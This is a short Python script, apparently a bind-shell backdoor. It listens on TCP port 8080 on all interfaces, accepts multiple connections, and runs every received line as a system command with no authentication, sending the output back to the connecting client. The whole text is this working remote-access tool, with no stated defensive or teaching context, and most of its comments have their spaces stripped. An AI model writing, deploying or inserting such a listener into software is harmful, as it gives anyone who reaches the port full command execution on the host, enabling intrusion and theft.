import socket,select,os,subprocess

#Createandbindsocket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 8080))

#Listenforupto10connections
s.listen(10)
input = [s]

while 1:
    #Checkforsocketswaitingread
    reader,output,exceptions=select.select(input,[],[])
    for sock in reader:
            #Ifthesocket isour listener, accept anewconnection
            if sock == s:
                c,addr = s.accept()
                print("Newconnectionfrom " , addr)
                input.append(c)
            #otherwise, it's acommandtoexecute
            else:
                command=sock.recv(1024)
                if command:
                    shell =command.rstrip().split(" ")
                    try:
                        out=subprocess.Popen(shell,stdout=subprocess.PIPE).communicate()[0]
                    except:
                        out="Commandfailed\n"
                    sock.send(out)
                else:
                    sock.close()
                    input.remove(sock)
s.close()